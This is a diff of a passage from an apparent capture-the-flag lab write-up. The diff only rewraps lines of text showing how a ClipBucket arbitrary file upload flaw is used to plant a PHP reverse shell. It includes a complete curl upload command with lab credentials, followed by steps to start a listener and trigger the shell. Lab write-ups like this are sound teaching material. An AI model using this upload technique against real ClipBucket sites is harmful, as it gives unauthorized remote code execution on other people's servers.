@@ -66,12 +66,14 @@ So we search for exploits in this version using the searchsploit command and com
 (Although the name of the exploit shows that it is for versions lower than 4.0 , the comments inside the file say that it has been tested on version 4 too.)
 
 ```py
-Clipbucket version 2.8.3 and version 4.0.0 have been tested. These versions were the latest at the time the security vulnerabilities were discovered.
+Clipbucket version 2.8.3 and version 4.0.0 have been tested. These versions were the latest at the time 
+the security vulnerabilities were discovered.
 ```
 There is a section in the exploit about arbitrary file upload to a ClipBucket website,so we try out that exploit to upload a php reverse shell.
 
 ```py
-curl -F "file=@/opt/reverse_shell.php" -F "plupload=1" -F "name=anyname.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
+curl -F "file=@/opt/reverse_shell.php" -F "plupload=1" -F "name=anyname.php"
+ "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
 ```
 After that we start our listener on the specified port and navigate to the /actions/ directory and click on our exploit to open it.
 
